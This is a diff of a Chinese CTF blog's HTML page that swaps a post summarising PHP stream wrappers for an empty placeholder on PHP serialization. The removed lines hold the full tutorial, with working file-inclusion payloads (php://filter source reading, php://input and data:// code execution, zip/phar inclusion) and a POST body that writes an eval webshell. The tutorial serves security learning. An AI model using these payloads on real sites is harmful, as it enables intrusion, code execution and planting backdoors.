@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="PHP伪协议总结, Marmalade&#39;s Blog">
+    <meta name="keywords" content="phpserializezongjie, Marmalade&#39;s Blog">
     <meta name="description" content="一个ctfer的成长之路">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>PHP伪协议总结 | Marmalade&#39;s Blog</title>
+    <title>phpserializezongjie | Marmalade&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -376,12 +376,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/rice-terraces-3466518_960_720.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">PHP伪协议总结</h1>
+                    <h1 class="description center-align post-title">phpserializezongjie</h1>
                 </div>
             </div>
         </div>
@@ -495,25 +495,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                                <span class="chip bg-color">php伪协议</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/web/" class="post-category">
-                                web
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -522,28 +509,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-04-09
+                    2021-04-10
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2021-04-22
+                    2021-04-10
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    0
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    1 分
                 </div>
                 
 
@@ -563,289 +550,7 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="PHP伪协议总结"><a href="#PHP伪协议总结" class="headerlink" title="PHP伪协议总结"></a>PHP伪协议总结</h1><p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">转文章，侵删</a>记录总结了PHP伪协议全面的利用姿势</p>
-<blockquote>
-<p>参考了这篇文章：<a href="https://www.freebuf.com/column/148886.html" target="_blank" rel="noopener">php伪协议实现命令执行的七种姿势</a>，并根据自己理解进行了总结，也算是加深一下印象，方便以后使用。</p>
-</blockquote>
-<h2 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:off/on</li>
-<li><code>allow_url_include</code> :off/on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
-</li>
-<li><p><strong>说明</strong>：<br><code>file://</code> 文件系统是 PHP 使用的默认封装协议，展现了本地文件系统。当指定了一个相对路径（不以/、、\或 Windows 盘符开头的路径）提供的路径将基于当前的工作目录。在很多情况下是脚本所在的目录，除非被修改了。使用 CLI 的时候，目录默认是脚本被调用时所在的目录。在某些函数里，例如 <code>fopen()</code> 和 <code>file_get_contents()</code>，<code>include_path</code>会可选地搜索，也作为相对的路径。</p>
-</li>
-<li><p><strong>用法</strong>：</p>
-<pre><code>/path/to/file.ext
-relative/path/to/file.ext
-fileInCwd.ext
-C:/path/to/winfile.ext
-C:\path\to\winfile.ext
-\\smbserver\share\path\to\winfile.ext
-file:///path/to/file.ext</code></pre></li>
-<li><p><strong>示例</strong>：</p>
-<ol>
-<li><p><code>file://[文件的绝对路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172418.png" alt="图片描述"></p>
-</li>
-<li><p><code>[文件的相对路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=./phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172419.png" alt="图片描述"></p>
-</li>
-<li><p><code>[http：//网络路径和文件名]</code></p>
-<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172420.png" alt="图片描述"></p>
-</li>
-</ol>
-</li>
-<li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.file.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.file.php</a></p>
-</li>
-</ul>
-<h2 id="php-协议"><a href="#php-协议" class="headerlink" title="php:// 协议"></a><code>php://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:off/on</li>
-<li><code>allow_url_include</code> :仅<code>php://input php://stdin php://memory php://temp</code>需要on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：<br><code>php://</code> 访问各个输入/输出流（I/O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
-</li>
-<li><p><strong>说明</strong>：<br>PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</p>
-<table>
-<thead>
-<tr>
-<th>协议</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>php://input</td>
-<td>可以访问请求的原始数据的只读流，在POST请求中访问POST的<code>data</code>部分，在<code>enctype="multipart/form-data"</code> 的时候<code>php://input</code>是无效的。</td>
-</tr>
-<tr>
-<td>php://output</td>
-<td>只写的数据流，允许以 print 和 echo 一样的方式写入到输出缓冲区。</td>
-</tr>
-<tr>
-<td>php://fd</td>
-<td>(&gt;=5.3.6)允许直接访问指定的文件描述符。例如 <code>php://fd/3</code> 引用了文件描述符 3。</td>
-</tr>
-<tr>
-<td>php://memory php://temp</td>
-<td>(&gt;=5.1.0)一个类似文件包装器的数据流，允许读写临时数据。两者的唯一区别是 <code>php://memory</code> 总是把数据储存在内存中，而 <code>php://temp</code> 会在内存量达到预定义的限制后（默认是 <code>2MB</code>）存入临时文件中。临时文件位置的决定和 <code>sys_get_temp_dir()</code> 的方式一致。</td>
-</tr>
-<tr>
-<td>php://filter</td>
-<td>(&gt;=5.0.0)一种元封装器，设计用于数据流打开时的筛选过滤应用。对于一体式<code>（all-in-one）</code>的文件函数非常有用，类似 <code>readfile()</code>、<code>file()</code> 和 <code>file_get_contents()</code>，在数据流内容读取之前没有机会应用其他过滤器。</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><strong><code>php://filter</code>参数详解</strong></p>
-<p>该协议的参数会在该协议路径上进行传递，多个参数都可以在一个路径上传递。具体参考如下：</p>
-<table>
-<thead>
-<tr>
-<th>php://filter 参数</th>
-<th>描述</th>
-<th></th>
-</tr>
-</thead>
-<tbody><tr>
-<td>resource=&lt;要过滤的数据流&gt;</td>
-<td>必须项。它指定了你要筛选过滤的数据流。</td>
-<td></td>
-</tr>
-<tr>
-<td>read=&lt;读链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（*\</td>
-<td>*）分隔。</td>
-</tr>
-<tr>
-<td>write=&lt;写链的过滤器&gt;</td>
-<td>可选项。可以设定一个或多个过滤器名称，以管道符（\</td>
-<td>）分隔。</td>
-</tr>
-<tr>
-<td>&lt;; 两个链的过滤器&gt;</td>
-<td>任何没有以 <em>read=</em> 或 <em>write=</em> 作前缀的筛选器列表会视情况应用于读或写链。</td>
-<td></td>
-</tr>
-</tbody></table>
-</li>
-<li><p><strong>可用的过滤器列表（4类）</strong></p>
-<p>此处列举主要的过滤器类型，详细内容请参考：<a href="https://www.php.net/manual/zh/filters.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/filters.php</a></p>
-<table>
-<thead>
-<tr>
-<th>字符串过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>string.rot13</td>
-<td>等同于<code>str_rot13()</code>，rot13变换</td>
-</tr>
-<tr>
-<td>string.toupper</td>
-<td>等同于<code>strtoupper()</code>，转大写字母</td>
-</tr>
-<tr>
-<td>string.tolower</td>
-<td>等同于<code>strtolower()</code>，转小写字母</td>
-</tr>
-<tr>
-<td>string.strip_tags</td>
-<td>等同于<code>strip_tags()</code>，去除html、PHP语言标签</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>转换过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>convert.base64-encode &amp; convert.base64-decode</td>
-<td>等同于<code>base64_encode()</code>和<code>base64_decode()</code>，base64编码解码</td>
-</tr>
-<tr>
-<td>convert.quoted-printable-encode &amp; convert.quoted-printable-decode</td>
-<td>quoted-printable 字符串与 8-bit 字符串编码解码</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>压缩过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>zlib.deflate &amp; zlib.inflate</td>
-<td>在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。</td>
-</tr>
-<tr>
-<td>bzip2.compress &amp; bzip2.decompress</td>
-<td>同上，在本地文件系统中创建 bz2 兼容文件的方法。</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>加密过滤器</th>
-<th>作用</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>mcrypt.*</td>
-<td>libmcrypt 对称加密算法</td>
-</tr>
-<tr>
-<td>mdecrypt.*</td>
-<td>libmcrypt 对称解密算法</td>
-</tr>
-</tbody></table>
-</li>
-<li><p><strong>示例</strong>：</p>
-<ol>
-<li><p><code>php://filter/read=convert.base64-encode/resource=[文件名]</code>读取文件源码（针对php文件需要base64编码）</p>
-<pre><code>http://127.0.0.1/include.php?file=php://filter/read=convert.base64-encode/resource=phpinfo.php</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172421.png" alt="图片描述"></p>
-</li>
-<li><p><code>php://input + [POST DATA]</code>执行php代码</p>
-<pre><code>http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php phpinfo(); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172422.png" alt="图片描述"></p>
-<p>若有写入权限，写入一句话木马</p>
-<pre><code>http://127.0.0.1/include.php?file=php://input
-[POST DATA部分]
-&lt;?php fputs(fopen('1juhua.php','w'),'&lt;?php @eval($_GET[cmd]); ?&gt;'); ?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172423.png" alt="图片描述"></p>
-</li>
-</ol>
-</li>
-<li><p><strong>参考</strong>：<a href="https://php.net/manual/zh/wrappers.php.php" target="_blank" rel="noopener">https://php.net/manual/zh/wrappers.php.php</a></p>
-</li>
-</ul>
-<h2 id="zip-amp-bzip2-amp-zlib-协议"><a href="#zip-amp-bzip2-amp-zlib-协议" class="headerlink" title="zip:// &amp; bzip2:// &amp; zlib:// 协议"></a><code>zip:// &amp; bzip2:// &amp; zlib://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:off/on</li>
-<li><code>allow_url_include</code> :off/on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。</p>
-</li>
-<li><p><strong>示例</strong>：</p>
-<ol>
-<li><p><code>zip://[压缩文件绝对路径]%23[压缩文件内的子文件名]</code>（#编码为%23）</p>
-<p>压缩 phpinfo.txt 为 phpinfo.zip ，压缩包重命名为 phpinfo.jpg ，并上传</p>
-<pre><code>http://127.0.0.1/include.php?file=zip://E:\phpStudy\PHPTutorial\WWW\phpinfo.jpg%23phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172424.png" alt="图片描述"></p>
-</li>
-<li><p><code>compress.bzip2://file.bz2</code></p>
-<p>压缩 phpinfo.txt 为 phpinfo.bz2 并上传（同样支持任意后缀名）</p>
-<pre><code>http://127.0.0.1/include.php?file=compress.bzip2://E:\phpStudy\PHPTutorial\WWW\phpinfo.bz2</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172425.png" alt="图片描述"></p>
-</li>
-<li><p><code>compress.zlib://file.gz</code></p>
-<p>压缩 phpinfo.txt 为 phpinfo.gz 并上传（同样支持任意后缀名）</p>
-<pre><code>http://127.0.0.1/include.php?file=compress.zlib://E:\phpStudy\PHPTutorial\WWW\phpinfo.gz</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172426.png" alt="图片描述"></p>
-</li>
-</ol>
-</li>
-<li><p><strong>参考</strong>：<a href="http://php.net/manual/zh/wrappers.compression.php" target="_blank" rel="noopener">http://php.net/manual/zh/wrappers.compression.php</a></p>
-</li>
-</ul>
-<h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:on</li>
-<li><code>allow_url_include</code> :on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
-</li>
-<li><p><strong>用法</strong>：</p>
-<pre><code>data://text/plain,
-data://text/plain;base64,</code></pre></li>
-<li><p><strong>示例</strong>：</p>
-<ol>
-<li><p><code>data://text/plain,</code></p>
-<pre><code>http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172427.png" alt="图片描述"></p>
-</li>
-<li><p><code>data://text/plain;base64,</code></p>
-<pre><code>http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172428.png" alt="图片描述"></p>
-</li>
-</ol>
-</li>
-</ul>
-<h2 id="http-amp-https-协议"><a href="#http-amp-https-协议" class="headerlink" title="http:// &amp; https:// 协议"></a><code>http:// &amp; https://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:on</li>
-<li><code>allow_url_include</code> :on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：常规 URL 形式，允许通过 <code>HTTP 1.0</code> 的 GET方法，以只读访问文件或资源。CTF中通常用于远程包含。</p>
-</li>
-<li><p><strong>用法</strong>：</p>
-<pre><code>http://example.com
-http://example.com/file.php?var1=val1&amp;var2=val2
-http://user:password@example.com
-https://example.com
-https://example.com/file.php?var1=val1&amp;var2=val2
-https://user:password@example.com</code></pre></li>
-<li><p><strong>示例</strong>：</p>
-<pre><code>http://127.0.0.1/include.php?file=http://127.0.0.1/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172429.png" alt="图片描述"></p>
-</li>
-</ul>
-<h2 id="phar-协议"><a href="#phar-协议" class="headerlink" title="phar:// 协议"></a><code>phar://</code> 协议</h2><p><code>phar://</code>协议与<code>zip://</code>类似，同样可以访问zip格式压缩包内容，在这里只给出一个示例：</p>
-<pre><code>http://127.0.0.1/include.php?file=phar://E:/phpStudy/PHPTutorial/WWW/phpinfo.zip/phpinfo.txt</code></pre><p><img src="https://gitee.com/marmalade0/images/raw/master/img/20210409172430.png" alt="图片描述"></p>
-<p>另外在 Black Hat 2018 大会上，研究人员公布了一款针对PHP应用程序的全新攻击技术：<strong>phar://协议对象注入技术</strong>。</p>
-<p>因为该利用点需要满足一定的条件才能利用，可以参考下面这篇文章，里面的demo也非常详细，留作以后专门研究一下。</p>
-<blockquote>
-<p>参考文章：<a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">seebug - 利用 phar 拓展 php 反序列化漏洞攻击面</a><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a>)</p>
-</blockquote>
-
+                
                 
             </div>
             <hr/>
@@ -871,7 +576,7 @@ https://user:password@example.com</code></pre></li>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://marmalade.vip/phpweixieyizongjie.html">https://marmalade.vip/phpweixieyizongjie.html</a>
+                    <a href="https://marmalade.vip/phpserializezongjie.html">https://marmalade.vip/phpserializezongjie.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -908,11 +613,7 @@ https://user:password@example.com</code></pre></li>
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-                                    <span class="chip bg-color">php伪协议</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -1345,9 +1046,10 @@ https://user:password@example.com</code></pre></li>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/phpserializezongjie.html">
                     <div class="card-image">
@@ -1365,9 +1067,9 @@ https://user:password@example.com</code></pre></li>
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-10
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -1376,6 +1078,7 @@ https://user:password@example.com</code></pre></li>
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -1386,23 +1089,23 @@ https://user:password@example.com</code></pre></li>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/xsshaozishootingrange.html">
+                <a href="/phpweixieyizongjie.html">
                     <div class="card-image">
                         
-                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/embrasure-3102315_960_720.jpg" class="responsive-img" alt="XSS漏洞介绍及靶场实战">
+                        <img src="https://gitee.com/marmalade0/images/raw/master/www.marmalade.vip/background/rice-terraces-3466518_960_720.png" class="responsive-img" alt="PHP伪协议总结">
                         
-                        <span class="card-title">XSS漏洞介绍及靶场实战</span>
+                        <span class="card-title">PHP伪协议总结</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            本文将大体介绍XSS的漏洞以及利用方式，并且借助一个xss靶场系统来深入讲解
+                            记录总结了PHP伪协议全面的利用姿势
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-05
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-04-09
                             </span>
                         <span class="publish-author">
                             
@@ -1419,8 +1122,8 @@ https://user:password@example.com</code></pre></li>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
+                    <a href="/tags/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
+                        <span class="chip bg-color">php伪协议</span>
                     </a>
                     
                 </div>
